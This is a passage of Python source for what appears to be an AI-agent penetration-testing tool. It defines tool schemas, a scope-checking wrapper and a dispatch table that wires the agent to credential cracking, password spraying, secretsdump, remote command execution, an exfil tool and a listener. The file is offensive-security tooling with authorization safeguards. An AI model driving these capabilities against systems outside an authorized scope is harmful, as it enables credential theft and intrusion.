        "read flags and escalate — a validated SSH login is a dead end without it.",
        {"target": {"type": "string"}, "host": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "key_file": {"type": "string", "description": "path to a private key (alternative to password)"},
         "port": {"type": "integer", "description": "default 22"}, "command": {"type": "string"}},
        ["user", "command"]),
    _fn("bloodhound_collect", "Collect AD attack-path data (users/groups/ACLs/sessions/GPOs/trusts) "
        "into a BloodHound zip via bloodhound-python. Read-only, heavy. Needs domain creds.",
        {"domain": {"type": "string"}, "dc_ip": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"}}, ["domain", "user"]),
    _fn("adcs_find", "Enumerate AD Certificate Services and flag vulnerable templates (ESC1-ESC16) via "
        "certipy. Read-only. Needs domain creds.",
        {"domain": {"type": "string"}, "dc_ip": {"type": "string"}, "user": {"type": "string"},
         "password": {"type": "string"}, "nthash": {"type": "string"}}, ["domain", "user"]),
    _fn("dc_vuln_check", "SAFE detection-only checks for known DC/Windows flaws (Zerologon, noPac, "
        "PetitPotam, MS17-010) via netexec modules — detection, NOT exploitation. Read-only.",
        {"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"},
         "checks": {"type": "array", "items": {"type": "string"}}}, []),
    _fn("hash_crack", "Crack recovered hashes OFFLINE (hashcat/john) against a wordlist. Safe — no "
        "target contact. hash_type is a hashcat mode (18200 AS-REP, 13100 Kerberoast, 1000 NTLM).",
        {"hashes": {"type": "array", "items": {"type": "string"}}, "hash_type": {"type": "string"},
         "wordlist": {"type": "string", "description": "path to a wordlist, e.g. rockyou.txt"}},
        ["hashes", "wordlist"]),
    _fn("cred_check", "Validate ONE credential across the target's auth services (smb/winrm/rdp/ldap/"
        "mssql/ssh/ftp) via netexec — 'where does this credential actually work?'. Read-only. Run this "
        "on ANY credential you recover: one that fails one service often works another (e.g. RDP but "
        "not WinRM), so never conclude from a single service.",
        {"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"},
         "nthash": {"type": "string"}, "domain": {"type": "string"},
         "services": {"type": "array", "items": {"type": "string"},
                      "description": "subset to test; default smb,winrm,rdp,ldap,mssql,ssh,ftp"}},
        ["user"]),
    _fn("ledger", "Your engagement working-memory: surface (open services), creds (+ where tested), "
        "facts, ranked hypotheses (with status), and what you've tried. action='show' returns it; "
        "action='update' merges `data` (list fields append+dedup). Review it before deciding the next "
        "move so you don't circle or leave an obvious lead (a found cred, an untested service) untouched.",
        {"action": {"type": "string", "enum": ["show", "update", "clear"]},
         "data": {"type": "object", "description": "fields to merge, e.g. {\"creds\":[...],\"hypotheses\":[...],\"tried\":[...]}"}},
        []),
]


def _guarded(name: str, fn: Callable[..., Any], ctx: ScanContext) -> Callable[[dict], Any]:
    """Wrap one tool so the authorized-scope check runs before its body. The wrapper is a
    coroutine on purpose: llm._run_tool builds the task with ensure_future(fn(args)) outside
    its try block, so a ToolError raised synchronously here would abort the whole run instead
    of coming back to the model as a recoverable "out of scope" tool result."""
    async def run(args: dict) -> Any:
        _enforce_scope(name, args or {}, ctx)
        return await fn(ctx, args)
    run.__name__ = f"guarded_{name}"
    return run


def build_dispatch(ctx: ScanContext) -> dict[str, Callable[[dict], Any]]:
    """Tool name -> coroutine, each one scope-guarded. Add a tool here and it is guarded
    automatically; see _SCOPE_EXEMPT_TOOLS for the ones with no network target."""
    impls: dict[str, Callable[..., Any]] = {
        "set_target":         set_target,
        "port_scan":          port_scan,
        "service_detect":     service_detect,
        "vuln_scan":          vuln_scan,
        "os_detect":          os_detect,
        "ping_sweep":         ping_sweep,
        "dns_enum":           dns_enum,
        "banner_grab":        banner_grab,
        "http_probe":         http_probe,
        "content_discovery":  content_discovery,
        "web_request":        web_request,
        "http_download":      http_download,
        "run_nmap":           run_nmap,
        "nuclei_scan":        nuclei_scan,
        "request_consent":    request_consent,
        "exploit_search":     exploit_search,
        "ftp_anon":           ftp_anon,
        "ftp_get":            ftp_get,
        "smb_enum":           smb_enum,
        "ssl_info":           ssl_info,
        "tcp_send":           tcp_send,
        "snmp_check":         snmp_check,
        "kerbrute_userenum":  kerbrute_userenum,
        "asrep_roast":        asrep_roast,
        "kerberoast":         kerberoast,
        "ldap_enum":          ldap_enum,
        "rid_brute":          rid_brute,
        "smb_shares":         smb_shares,
        "smb_get":            smb_get,
        "password_spray":     password_spray,
        "secretsdump":        secretsdump,
        "win_exec":           win_exec,
        "ssh_exec":           ssh_exec,
        "bloodhound_collect": bloodhound_collect,
        "adcs_find":          adcs_find,
        "dc_vuln_check":      dc_vuln_check,
        "hash_crack":         hash_crack,
        "cred_check":         cred_check,
        "ledger":             ledger,
        "hydra_brute":        hydra_brute,
        "attacker_info":      attacker_info,
        "exfil":              exfil,
        "listener":           listener,
        "shell_exec":         shell_exec,
        "note":               note,
        "report_finding":     report_finding,
        "get_findings":       get_findings,
    }
    return {name: _guarded(name, fn, ctx) for name, fn in impls.items()}


def dependency_status() -> list[dict]:
    """Live install status of every EXTERNAL binary pwner can shell out to, with the
    pwner tools each one powers and how to install it. nmap is core; the rest are optional
    and only matter when the relevant tools are used."""
    checks = [
        ("nmap", bool(shutil.which(NMAP_BIN)), "brew install nmap", True,
         "port_scan/service_detect/vuln_scan/os_detect/ping_sweep/smb_enum/ssl_info/run_nmap"),
        ("nuclei", has_nuclei(), "brew install nuclei", False, "nuclei_scan"),
        ("hydra", has_hydra(), "brew install hydra", False, "hydra_brute"),
        ("snmpwalk", bool(shutil.which(SNMPWALK_BIN)), "brew install net-snmp", False, "snmp_check"),
        ("searchsploit", bool(shutil.which("searchsploit")), "brew install exploitdb", False,
         "exploit_search (ExploitDB)"),
        ("impacket", bool(_impacket("GetNPUsers")), "pipx install impacket", False,
         "asrep_roast/kerberoast/secretsdump/win_exec"),
        ("netexec", bool(_netexec()), "pipx install netexec", False,
         "ldap_enum/rid_brute/smb_shares/smb_get/password_spray/win_exec(winrm)/ssh_exec/dc_vuln_check"),
        ("kerbrute", bool(shutil.which("kerbrute")),
         "download from github.com/ropnop/kerbrute (prebuilt binary)", False, "kerbrute_userenum"),
        ("certipy", bool(_which_any("certipy", "certipy-ad")), "pipx install certipy-ad", False, "adcs_find"),
        ("bloodhound-python", bool(shutil.which("bloodhound-python")), "pipx install bloodhound", False,
         "bloodhound_collect"),
        ("hashcat", bool(_which_any("hashcat", "john")), "brew install hashcat", False, "hash_crack"),
    ]
    return [{"name": n, "installed": ok, "install": ins, "core": core, "enables": en}
            for (n, ok, ins, core, en) in checks]


def missing_tool_names() -> list[str]:
    return [t["name"] for t in dependency_status() if not t["installed"]]


def _env_note() -> str:
    """One factual line telling the agent which external tools are NOT installed here, so it
    avoids tools that would just fail. Environment state, not methodology."""
    missing = missing_tool_names()
    if not missing:
        return ""
    return (f"\nENVIRONMENT: these external tools are NOT installed on this machine, so any pwner "
            f"tool that needs one will fail — do not rely on them unless the operator installs them "
            f"(they can run /doctor): {', '.join(missing)}. Every other tool works normally.")


def brief(ctx: ScanContext, instructions: str = "") -> str:
    steer = (f"\n\nOPERATOR INSTRUCTIONS (weight these heavily):\n{instructions}"
             if instructions else "")
    return (f"AUTHORIZED TARGET: {ctx.target}\n"
            f"Engagement goal: network penetration test — discover live hosts, enumerate open ports "
            f"and services, fingerprint versions/OS, detect known vulnerabilities, and report confirmed "
            f"findings with severity and remediation.\n"
            f"Establish the surface first (ping_sweep for a CIDR, dns_enum for a domain), then "
            f"port_scan -> service_detect -> exploit_search/nuclei/vuln_scan -> report. Reason from "
            f"what you observe; brute-force only when the target genuinely warrants it."
            + _env_note() + steer)
